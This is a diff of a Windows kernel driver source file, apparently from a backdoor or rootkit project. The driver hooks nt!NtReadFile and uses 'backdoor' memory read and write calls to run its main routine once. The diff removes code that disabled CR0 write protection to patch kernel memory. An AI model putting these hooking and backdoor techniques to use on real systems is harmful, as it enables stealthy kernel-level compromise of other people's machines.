@@ -1,11 +1,5 @@
 #include "stdafx.h"
 
-// make crt functions inline
-#pragma intrinsic(memcpy)
-
-// write protect bit of CR0 register
-#define CR0_WP 0x00010000
-
 // size of the nt!NtReadFile() call stub
 #define MAX_CALLGATE_LEN 0x40
 
@@ -26,16 +20,31 @@ PVOID m_Driver = NULL;
 // callgate for original nt!NtReadFile()
 UCHAR old_NtReadFile[MAX_CALLGATE_LEN];
 //--------------------------------------------------------------------------------------
-void wp_disable(void)
+void *bd_alloc(size_t size)
 {
-    // disable write protection
-    _cr0_set(_cr0_get() & ~CR0_WP);
+    // heap alloc
+    return I_ExAllocatePool(NonPagedPool, size);
 }
 
-void wp_enable(void)
+void bd_free(void *addr)
 {
-    // restore write protection
-    _cr0_set(_cr0_get() | CR0_WP);
+    // heap free
+    I_ExFreePool(addr);
+}
+
+void bd_sleep(int msec)
+{
+    // not implemented
+}
+
+void bd_yeld(void)
+{
+    // not implemented
+}
+
+void bd_printf(char *format, ...)
+{
+    // not implemented
 }
 //--------------------------------------------------------------------------------------
 NTSTATUS DriverMain(void)
@@ -59,24 +68,29 @@ NTSTATUS NTAPI new_NtReadFile(
     PLARGE_INTEGER ByteOffset,
     PULONG Key)
 {
-    PVOID KernelBase = NULL;
+    uint64_t Addr = 0;
+    uint32_t Val = 0;
 
-    if ((KernelBase = GetKernelBase()) != NULL)
+    // get call counter address
+    if (backdoor_ept_info_addr(&Addr) == 0)
     {
-        PIMAGE_DOS_HEADER pHeader = (PIMAGE_DOS_HEADER)KernelBase;
-
-        // check if handler was already executed
-        if (pHeader->e_res[0] == 0x0000)
+        // read call counter
+        if (backdoor_virt_read_32(Addr, &Val) == 0)
         {
-            DriverMain();
-        }        
+            // check if hook handler was already executed
+            if (Val == 0)
+            {
+                // exeute main function
+                DriverMain();
+            }
 
-        wp_disable();
-
-        // notify backdoor client that DriverMain() was executed
-        pHeader->e_res[0] = 0xffff;
-
-        wp_enable();
+            // update call counter
+            backdoor_virt_write_32(Addr, Val + 1);
+        }
+        else
+        {
+            DbgMsg(__FILE__, __LINE__, "ERROR: backdoor_phys_read_32() fails\n");
+        }
     }    
 
     // call original function
